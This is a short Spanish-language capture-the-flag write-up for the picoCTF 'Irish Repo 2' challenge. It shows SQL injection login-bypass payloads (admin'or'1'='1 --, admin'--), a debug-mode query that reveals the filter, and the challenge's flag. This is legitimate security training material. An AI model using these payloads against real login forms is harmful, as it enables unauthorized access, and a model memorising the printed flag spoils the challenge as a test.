# USERNAME -> amcdanymx

# Irish Repo 2


## Description

There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

## Pistas
- The password is being filtered.

## Solución
Entramos al link que se nos proporciona, al entrar al sitio vemos que 
se parece al primer desafío,  así que vayamos al inicio de sesión del administrador, entonces probemos el Basic Payload como antes

*admin'or'1'='1 --* 

Nos muestra lo siguiente al entrar:

#### SQLi detected.

Vemos el código fuente del sitio para revisar el login probablemente 
Tenemos el modo de debug  0
Lo que haré es cambiarlo de 0 a 1


```

username: admin'or'1'='1
password: admin'or'1'='1 --
SQL query: SELECT * FROM users WHERE name='admin'or'1'='1' AND password='admin'or'1'='1 --'

# SQLi detected.
```

Vemos que pasa si ingresamo como lo siguiente:

```
admin'--
```

Conseguimos la bandera
```
picoCTF{m0R3_SQL_plz_c34df170}

```